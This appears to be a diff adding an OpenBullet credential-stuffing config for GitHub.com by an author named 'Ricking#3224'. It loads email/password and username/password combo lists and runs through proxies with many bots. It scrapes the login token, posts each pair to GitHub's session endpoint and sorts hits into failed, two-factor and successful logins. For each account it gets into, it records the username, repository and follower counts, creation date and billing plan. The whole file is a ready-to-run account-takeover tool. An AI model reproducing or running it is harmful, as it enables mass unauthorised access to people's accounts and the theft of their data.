@@ -1,0 +1,112 @@
+[SETTINGS]
+{
+  "Name": "GitHub.com",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-22T13:26:51.4529857-08:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#TIME FUNCTION CurrentUnixTime -> VAR "bc" 
+
+#USER FUNCTION URLEncode "<USER>" -> VAR "USER1" 
+
+#PASS FUNCTION URLEncode "<PASS>" -> VAR "PASS1"
+
+#AUTH_KEY_REQ REQUEST GET "https://github.com/session" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#AUTH_KEY_CAP PARSE "<SOURCE>" LR "=\"authenticity_token\" value=\"" "\"" -> VAR "auth1" 
+
+#AUTH_KEY FUNCTION URLEncode "<auth1>" -> VAR "authtoken" 
+
+#LOGIN_REQ REQUEST POST "https://github.com/session" 
+  CONTENT "commit=Sign+in&authenticity_token=<authtoken>&ga_id=2067617669.1603338905&login=<USER1>&password=<PASS1>&webauthn-support=supported&webauthn-iuvpaa-support=unsupported&return_to=&allow_signup=&client_id=&integration=&required_field_e0e1=&timestamp=<bc>&timestamp_secret=<bc>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: github.com" 
+  HEADER "Origin: https://github.com" 
+  HEADER "Referer: https://github.com/login" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY " Incorrect username or password" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Device verification" 
+  KEYCHAIN Success OR 
+    KEY "click=\"Header, sign out" 
+
+#USERNAME PARSE "<SOURCE>" LR "<meta name=\"user-login\" content=\"" "\">" CreateEmpty=FALSE -> CAP "Username" 
+
+#API_REQ REQUEST GET "https://api.github.com/users/<Username>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#REPOS PARSE "<SOURCE>" JSON "public_repos" CreateEmpty=FALSE -> CAP "Repos" 
+
+#FOLLOWERS PARSE "<SOURCE>" JSON "followers" CreateEmpty=FALSE -> CAP "Followers" 
+
+#FOLLOWING PARSE "<SOURCE>" JSON "following" CreateEmpty=FALSE -> CAP "Following" 
+
+#Account_Creation PARSE "<SOURCE>" LR "\"created_at\":\"" "T" CreateEmpty=FALSE -> CAP "Account Created On" 
+
+#PLAN_REQ REQUEST GET "https://github.com/settings/billing?_pjax=%23js-pjax-container" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#PLAN_CAP PARSE "<SOURCE>" LR "<div>GitHub " "</div>" CreateEmpty=FALSE -> CAP "Plan" "Github " "" 
+
+
+
